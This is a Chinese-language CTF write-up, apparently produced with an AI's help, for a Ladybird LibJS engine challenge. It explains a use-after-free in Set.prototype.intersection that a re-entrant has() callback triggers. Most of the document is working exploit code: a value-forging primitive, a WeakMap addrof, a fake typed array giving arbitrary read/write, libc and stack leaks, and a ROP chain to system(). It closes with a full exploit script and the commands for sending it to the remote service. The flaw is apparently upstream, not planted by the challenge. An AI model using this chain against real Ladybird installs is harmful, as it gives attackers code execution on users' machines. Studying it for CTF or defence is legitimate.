# sekaiCTF 2026-BinaryExploitation-3in1_ladybird js 0day 

GPT 干的，

本文记录 `pwn_3in1` 题目里 Ladybird/LibJS 这一层的漏洞链。结论先放前面：漏洞点在 `Set.prototype.intersection()` 的重入处理里，C++ range-for 保存了指向 `Set` 内部哈希表 entry 的引用，随后调用了用户可控的 `other.has()`。攻击者可以在 `has()` 回调中清空原 `Set`，释放当前迭代 entry 所在的 backing storage，再用可控对象复用这块内存。函数返回后继续读取 `element.key`，形成 UAF。利用链为：

```text
Set.intersection re-entrant UAF
  -> forge arbitrary JS::Value
  -> WeakMap addrof
  -> fake/alias TypedArray object
  -> ArrayBuffer backing pointer overwrite
  -> arbitrary read/write
  -> leak libjs/libc/stack
  -> overwrite JS interpreter return address
  -> system(command)
```

当前 workspace 里已经有几个分阶段 PoC：

- `pwn_3in1/ladybird_set_intersection_poc.js`：验证 `Set.intersection` UAF 可控。
- `pwn_3in1/ladybird_weakmap_addrof_probe.js`：用 `WeakMap` 做 `addrof`。
- `pwn_3in1/ladybird_fake_ta_success_probe.js`：验证 fake typed-array 布局命中。
- `pwn_3in1/ladybird_arw_spin.js`：构造 ARW 并泄露基址。
- `pwn_3in1/ladybird_rop_system_probe.js`：完整打到 `system()`。

## 1. 环境与题目限制

题目 README 给的 Ladybird commit 为：

```text
Ladybird: https://github.com/LadybirdBrowser/ladybird.git @ 53a956c68c034bda97035c9edaf39c1cabad96ff
```

`patches/ladybird_1.patch` 主要是调整 JS-only 构建，并删掉 `js` shell 里的辅助接口，例如 `print`、`loadJSON`、`exit` 等。这个 patch 没有直接引入漏洞，漏洞来自给定 Ladybird commit 里的 LibJS 实现。

远端入口流程是：

1. `pwn_3in1/run.py` 读取一行 base64。
2. 解码后追加 `//`，写成临时 `.js` 文件。
3. 调用 `/challenge/run.sh` 启动 QEMU。
4. guest `/init` 把 `/dev/vda` 里的脚本拷到 `/home/user/challenge.js`。
5. 以普通用户运行：

```sh
/usr/bin/js --disable-ansi-colors /home/user/challenge.js
```

所以 Ladybird 这层拿到的是 guest 内 `uid=1000(user)` 的代码执行。它是后续内核提权或 QEMU 逃逸的入口，不是整题最终权限。

## 2. 根因：Set.intersection 重入 UAF

漏洞代码在：

```text
ladybird-src-full/Libraries/LibJS/Runtime/SetPrototype.cpp:254
```

关键逻辑如下：

```cpp
if (set->set_size() <= other_record.size) {
    for (auto const& element : *set) {
        auto in_other = TRY(call(vm, *other_record.has,
            other_record.set_object, element.key)).to_boolean();

        if (in_other) {
            if (!set_data_has(result, element.key))
                result->set_add(element.key);
        }
    }
}
```

问题点有三个：

1. `for (auto const& element : *set)` 保存的是 `Set` 内部哈希表 entry 的引用。
2. `other_record.has` 是 JS 层可控函数，会在 C++ 迭代过程中回调到攻击者代码。
3. 回调返回后，代码继续使用 `element.key` 两次。

如果在 `other.has()` 里执行 `victim.clear()`，原 `Set` 的内部存储会被释放或重置。此时 `element` 仍然指向旧 entry。随后用 `Uint8Array.fromHex()`、`WeakMap` 等对象复用这块内存，就能控制或泄露后续读取的 `element.key`。

触发时要注意进入第一条分支：

```js
set->set_size() <= other_record.size
```

JS 侧让 `other.size` 足够大即可，例如 `999`。`keys()` 方法只是为了满足 `GetSetRecord(other)`，正常利用路径不会走 `keys()` 分支。

最小化触发模型：

```js
let victim = new Set();
victim.add({ marker: "old" });

let keep;
let other = {
    size: 999,
    has() {
        victim.clear();                  // 释放当前 Set entry
        keep = Uint8Array.fromHex(hex);  // 复用 freed slot
        return true;
    },
    keys() {
        return [][Symbol.iterator]();
    },
};

let result = [...victim.intersection(other)];
```

如果 `Uint8Array.fromHex(hex)` 的 backing storage 正好复用 freed Set entry，`result[0]` 就会来自 `hex` 中伪造的 8 字节 `JS::Value`。

## 3. 原语一：伪造任意 JS::Value

LibJS 的 `Value` 使用 NaN-boxing。当前构建里对象 tag 是 `0xfff9`，也就是：

```js
const OBJECT_TAG = 0xfff9n;
function encodeObject(ptr) {
    return (OBJECT_TAG << 48n) | (ptr & 0xffffffffffffn);
}
```

基础伪造函数思路：

```js
function le64(x) {
    let out = "";
    for (let i = 0n; i < 8n; ++i)
        out += Number((x >> (8n * i)) & 0xffn).toString(16).padStart(2, "0");
    return out;
}

function forgeValue(encoded, attempts = 5000) {
    let hex = "";
    for (let i = 0; i < 24; ++i)
        hex += le64(encoded);

    for (let attempt = 0; attempt < attempts; ++attempt) {
        let victim = new Set();
        victim.add({ old: attempt });

        let keep;
        let other = {
            size: 999,
            has() {
                victim.clear();
                keep = Uint8Array.fromHex(hex);
                return true;
            },
            keys() { return [][Symbol.iterator](); },
        };

        let result = [...victim.intersection(other)];
        if (result.length === 1)
            return result[0];
    }

    throw new Error("forge failed");
}
```

这里 `keep` 必须保留住复用内存的对象，避免被 GC 或后续分配扰动。`hex` 重复喷同一个 qword，是为了降低 UAF slot 对齐不完全时的失败率。

可以先伪造一个 int32 `Value` 做 sanity check，例如当前构建中 `0x7ffa000041424344n` 可以被解释成整数值。稳定之后再伪造 object value。

## 4. 原语二：WeakMap addrof

`WeakMap.prototype.set()` 最后会调用：

```cpp
weak_map->weak_map_set(&key.as_cell(), value);
```

内部 `WeakMap::weak_map_set()` 将 `Cell*` key 放入 `m_values` 哈希表：

```cpp
m_values.set(key, value);
```

因此可以把 freed Set entry 复用成 WeakMap 的哈希表 entry。这样 `Set.intersection()` 返回时读取到的 `element.key` 不再是合法 `JS::Value`，而是一个裸 `Cell*` 指针。由于高 16 bit 不是 LibJS 的对象 tag，它会被 JS 层当成 number/double。再用 `DataView` 把这个 number 的 IEEE754 bits 取出来，就得到了对象地址。

核心代码：

```js
function bitsOfNumber(n) {
    let ab = new ArrayBuffer(8);
    let dv = new DataView(ab);
    dv.setFloat64(0, n, true);
    return dv.getBigUint64(0, true);
}

function addrofViaWeakMap(target, attempts = 5000) {
    for (let attempt = 0; attempt < attempts; ++attempt) {
        let victim = new Set();
        victim.add({ old: attempt });

        let keep;
        let other = {
            size: 999,
            has() {
                victim.clear();
                keep = new WeakMap([[target, 0x1337]]);
                return true;
            },
            keys() { return [][Symbol.iterator](); },
        };

        let result = [...victim.intersection(other)];
        if (result.length !== 1 || typeof result[0] !== "number")
            continue;

        let bits = bitsOfNumber(result[0]);
        if (bits > 0x100000000000n && bits < 0x0000800000000000n)
            return bits;
    }

    throw new Error("addrof failed");
}
```

这个原语的输出是 `target` 对象的真实 `Cell*` 地址。

## 5. 原语三：fake typed-array 到 ARW

拿到 `addrof` 后，需要把任意对象伪造成可读写内存的对象。当前利用使用的是 typed-array / ArrayBuffer 布局。

分配布局：

```js
let prev = new ArrayBuffer(0x100);
let target = new ArrayBuffer(0x100);
let prevView = new Uint8Array(prev);
prevView[0] = i;

target.p = 0x1111 + i;
target.q = 0x2222 + i;
```

随后泄露 `target` 地址，并伪造 object value：

```js
let targetAddr = addrofViaWeakMap(target);
let fake = forgeValue(encodeObject(targetAddr - 0x68n));
```

这里的 `targetAddr - 0x68` 是当前堆布局下的实测偏移。命中时，伪造出来的 `fake` 走的是 typed-array 的 indexed access 路径。`target.p`、`target.q` 是 inline property slot，位于 `target + 0x30` 附近；当前 int32 `Value` 的 tag bytes 在偏移 6、7 处表现为 `0xfa, 0x7f`。所以用下面的条件确认布局命中：

```js
if (fake[6] !== 0xfa || fake[7] !== 0x7f)
    continue;
```

命中后，`fake[off]` 形成了一个 typed-array 索引读写窗口，窗口基址落在 `target + 0x30` 附近。当前布局下，`fake[0x10..0x17]` 对应的是 `target` 这个 `ArrayBuffer` 的 backing pointer。也就是说，写 `fake + 0x10` 会改掉 `target.[[ArrayBufferData]]`，随后 `DataView(target)` 就会跟着这个 backing pointer 读写任意地址。

核心构造如下：

```js
let dv = new DataView(target);

function fakeRead64(off) {
    let v = 0n;
    for (let j = 0; j < 8; ++j)
        v |= BigInt(fake[off + j]) << (8n * BigInt(j));
    return v;
}

function fakeWrite64(off, value) {
    for (let j = 0; j < 8; ++j)
        fake[off + j] = Number((value >> (8n * BigInt(j))) & 0xffn);
}

let origData = fakeRead64(0x10);

function setPtr(ptr) {
    fakeWrite64(0x10, ptr);
}

function read64(addr) {
    setPtr(addr);
    return dv.getBigUint64(0, true);
}

function write64(addr, value) {
    setPtr(addr);
    dv.setBigUint64(0, value, true);
}

function writeBytes(addr, bytes) {
    setPtr(addr);
    for (let j = 0; j < bytes.length; ++j)
        dv.setUint8(j, bytes[j]);
}
```

ARW 成功前再做一次交叉验证：

```js
setPtr(targetAddr + 0x30n);
if (dv.getUint8(6) !== 0xfa || dv.getUint8(7) !== 0x7f) {
    fakeWrite64(0x10, origData);
    continue;
}
fakeWrite64(0x10, origData);
```

这一步确认 `DataView(target)` 确实已经跟随被改写的 backing pointer 读到了 `target + 0x30`。确认后恢复 `origData`，避免后续普通对象访问踩坏状态。

完整 ARW 函数在 `pwn_3in1/ladybird_rop_system_probe.js` 的 `makeARW()`。

## 6. 泄露 libjs、libc 和 stack

ARW 之后先读 `target` 对象开头的 vptr：

```js
let vptr = arw.read64(arw.targetAddr);
let libjs = vptr - 0x7d6628n;
```

`0x7d6628` 是当前 rootfs 里 `/usr/lib/ladybird/liblagom-js.so` 对应对象 vtable 到模块基址的偏移。换构建后需要重新定位。

接着通过 `libjs` 里的 GOT/动态符号泄露 libc：

```js
let freePtr = arw.read64(libjs + 0x819600n);
let libc = freePtr - 0xb5660n;
```

再通过 `environ` 泄露当前线程栈：

```js
let environAddr = arw.read64(libjs + 0x819748n);
let stack = arw.read64(environAddr);
```

当前实测偏移表：

```text
libjs_base = target_vptr - 0x7d6628
free@GOT   = libjs_base + 0x819600
libc_base  = free - 0xb5660
environ    = *(libjs_base + 0x819748)
stack      = *environ
```

这些偏移和 challenge rootfs 绑定。重新编译 Ladybird、换 glibc 或换链接参数后，都需要用 `readelf`、`objdump`、`nm` 或 GDB 重新确认。

## 7. ROP 到 system(command)

有 libc 和 stack 后，利用方式很直接：在当前 JS 执行栈上找一个稳定返回地址，改成 ROP 链。

当前 exploit 选择的返回地址特征值：

```js
let wantedRet = libjs + 0x245abfn;
let retSlot = 0n;

for (let off = 0x100n; off < 0x4000n; off += 8n) {
    let addr = stack - off;
    if (arw.read64(addr) === wantedRet) {
        retSlot = addr;
        break;
    }
}

if (retSlot === 0n)
    throw new Error("ret slot not found");
```

命令字符串写到当前 ArrayBuffer 原本的 backing storage 上：

```js
function asciiBytes(s) {
    let out = [];
    for (let i = 0; i < s.length; ++i)
        out.push(s.charCodeAt(i) & 0xff);
    out.push(0);
    return out;
}

let cmd = "id";
let cmdPtr = arw.origData;
arw.writeBytes(cmdPtr, asciiBytes(cmd));
```

当前 glibc gadget / symbol 偏移：

```text
ret     = libc + 0x28a8e
pop rdi = libc + 0x11bcfa
system  = libc + 0x5c560
exit    = libc + 0x486a0
```

最终栈布局：

```js
let ret = libc + 0x28a8en;
let popRdi = libc + 0x11bcfan;
let system = libc + 0x5c560n;
let exit = libc + 0x486a0n;

arw.write64(retSlot + 0x20n, exit);
arw.write64(retSlot + 0x18n, system);
arw.write64(retSlot + 0x10n, cmdPtr);
arw.write64(retSlot + 0x08n, popRdi);
arw.write64(retSlot, ret);
```

函数返回时执行：

```text
ret
pop rdi; ret
rdi = cmdPtr
system(cmdPtr)
exit()
```

本地验证时可以把命令换成：

```sh
id; cat /proc/self/status | grep -E 'Cap|NoNew|Seccomp|Uid|Gid'
```

也可以写文件验证，例如：

```sh
echo PWNED >/tmp/lb_pwned
```

## 8. 本地运行方式

只跑 Ladybird JS，不启动完整 QEMU：

```sh
JSROOT=/opt/2026_kernel_chall/sekaiCTF/pwn_3in1/rootfs
$JSROOT/lib64/ld-linux-x86-64.so.2 \
  --library-path $JSROOT/usr/lib/ladybird:$JSROOT/usr/lib \
  $JSROOT/usr/bin/js.real --disable-ansi-colors \
  /opt/2026_kernel_chall/sekaiCTF/pwn_3in1/ladybird_rop_system_probe.js
```

跑完整 challenge runtime：

```sh
base64 -w0 /opt/2026_kernel_chall/sekaiCTF/pwn_3in1/ladybird_rop_system_probe.js | \
  (cat; printf '\n') | \
  timeout 60s docker run --rm -i --privileged sekai-3in1-runtime /app/run
```

连远端时同理，把 JS exploit base64 后发给服务：

```sh
base64 -w0 /opt/2026_kernel_chall/sekaiCTF/pwn_3in1/ladybird_rop_system_probe.js
nc 3in1.chals.sekai.team 1337
```

远端提示 `Give me the b64 for your exploit:` 后粘贴 base64。

## 9. 稳定性注意点

1. `other.size` 必须大于等于 `victim.size`，否则 `intersection()` 会走 `other.keys()` 分支，UAF 路径不触发。
2. `victim.clear()` 必须发生在 `other.has()` 里，因为 C++ 此时已经把 `element` 引用拿到了栈上。
3. UAF 复用是概率性的，所以 `forgeValue()`、`addrofViaWeakMap()` 都需要循环尝试。
4. 复用对象要用 `keep` 保存，避免 GC 或临时对象析构改变堆布局。
5. `targetAddr - 0x68`、`fake[0x10]`、`target + 0x30` 都是当前 rootfs/commit 上实测布局。换构建要重新探测。
6. `libjs`、`libc`、ROP gadget 偏移都绑定当前二进制和 glibc。只要 rootfs 变了，就重新算。
7. JS RCE 默认是 guest 普通用户。后续 QEMU 逃逸大概率还要解决 guest 内权限问题，或者找到普通用户可触达的设备/接口。

## exploit

```js
function bitsOfNumber(n) {
    let ab = new ArrayBuffer(8);
    let dv = new DataView(ab);
    dv.setFloat64(0, n, true);
    return dv.getBigUint64(0, true);
}

function le64(x) {
    let out = "";
    for (let i = 0n; i < 8n; ++i)
        out += Number((x >> (8n * i)) & 0xffn).toString(16).padStart(2, "0");
    return out;
}

function addrofViaWeakMap(target, attempts = 5000) {
    for (let attempt = 0; attempt < attempts; ++attempt) {
        let victim = new Set();
        victim.add({ old: attempt });
        let keep;
        let other = {
            size: 999,
            has() {
                victim.clear();
                keep = new WeakMap([[target, 0x1337]]);
                return true;
            },
            keys() { return [][Symbol.iterator](); },
        };
        let result = [...victim.intersection(other)];
        if (result.length !== 1 || typeof result[0] !== "number")
            continue;
        let bits = bitsOfNumber(result[0]);
        if (bits > 0x100000000000n && bits < 0x0000800000000000n)
            return bits;
        if (!keep && attempt === -1)
            console.log("keep");
    }
    throw new Error("addrof failed");
}

function forgeValue(encoded, attempts = 5000) {
    let hex = "";
    for (let i = 0; i < 24; ++i)
        hex += le64(encoded);

    for (let attempt = 0; attempt < attempts; ++attempt) {
        let victim = new Set();
        victim.add({ old: attempt });
        let keep;
        let other = {
            size: 999,
            has() {
                victim.clear();
                keep = Uint8Array.fromHex(hex);
                return true;
            },
            keys() { return [][Symbol.iterator](); },
        };
        let result = [...victim.intersection(other)];
        if (result.length === 1)
            return result[0];
        if (!keep && attempt === -1)
            console.log("keep");
    }
    throw new Error("forge failed");
}

const OBJECT_TAG = 0xfff9n;
function encodeObject(ptr) {
    return (OBJECT_TAG << 48n) | (ptr & 0xffffffffffffn);
}

function makeARW() {
    let keep = [];
    for (let i = 0; i < 128; ++i) {
        let prev = new ArrayBuffer(0x100);
        let target = new ArrayBuffer(0x100);
        let prevView = new Uint8Array(prev);
        prevView[0] = i;
        target.p = 0x1111 + i;
        target.q = 0x2222 + i;
        keep.push(prev, prevView, target);

        let targetAddr = addrofViaWeakMap(target);
        let fake = forgeValue(encodeObject(targetAddr - 0x68n));
        if (fake[6] !== 0xfa || fake[7] !== 0x7f)
            continue;

        let dv = new DataView(target);
        function fakeRead64(off) {
            let v = 0n;
            for (let j = 0; j < 8; ++j)
                v |= BigInt(fake[off + j]) << (8n * BigInt(j));
            return v;
        }
        function fakeWrite64(off, value) {
            for (let j = 0; j < 8; ++j)
                fake[off + j] = Number((value >> (8n * BigInt(j))) & 0xffn);
        }
        let origData = fakeRead64(0x10);
        function setPtr(ptr) {
            fakeWrite64(0x10, ptr);
        }
        function read64(addr) {
            setPtr(addr);
            return dv.getBigUint64(0, true);
        }
        function write64(addr, value) {
            setPtr(addr);
            dv.setBigUint64(0, value, true);
        }
        function writeBytes(addr, bytes) {
            setPtr(addr);
            for (let j = 0; j < bytes.length; ++j)
                dv.setUint8(j, bytes[j]);
        }

        setPtr(targetAddr + 0x30n);
        if (dv.getUint8(6) !== 0xfa || dv.getUint8(7) !== 0x7f) {
            fakeWrite64(0x10, origData);
            continue;
        }
        fakeWrite64(0x10, origData);

        return { keep, targetAddr, origData, read64, write64, writeBytes };
    }
    throw new Error("ARW failed");
}

function asciiBytes(s) {
    let out = [];
    for (let i = 0; i < s.length; ++i)
        out.push(s.charCodeAt(i) & 0xff);
    out.push(0);
    return out;
}

let arw = makeARW();
let vptr = arw.read64(arw.targetAddr);
let libjs = vptr - 0x7d6628n;
let freePtr = arw.read64(libjs + 0x819600n);
let libc = freePtr - 0xb5660n;
let environAddr = arw.read64(libjs + 0x819748n);
let stack = arw.read64(environAddr);

let cmd = "ls -alh /";
let cmdPtr = arw.origData;
arw.writeBytes(cmdPtr, asciiBytes(cmd));

let wantedRet = libjs + 0x245abfn;
let retSlot = 0n;
for (let off = 0x100n; off < 0x4000n; off += 8n) {
    let addr = stack - off;
    if (arw.read64(addr) === wantedRet) {
        retSlot = addr;
        break;
    }
}
if (retSlot === 0n)
    throw new Error("ret slot not found");

let ret = libc + 0x28a8en;
let popRdi = libc + 0x11bcfan;
let system = libc + 0x5c560n;
let exit = libc + 0x486a0n;

console.error("libjs", "0x" + libjs.toString(16), "libc", "0x" + libc.toString(16));
console.error("stack", "0x" + stack.toString(16), "retSlot", "0x" + retSlot.toString(16), "cmd", "0x" + cmdPtr.toString(16));

arw.write64(retSlot + 0x20n, exit);
arw.write64(retSlot + 0x18n, system);
arw.write64(retSlot + 0x10n, cmdPtr);
arw.write64(retSlot + 0x08n, popRdi);
arw.write64(retSlot, ret);
```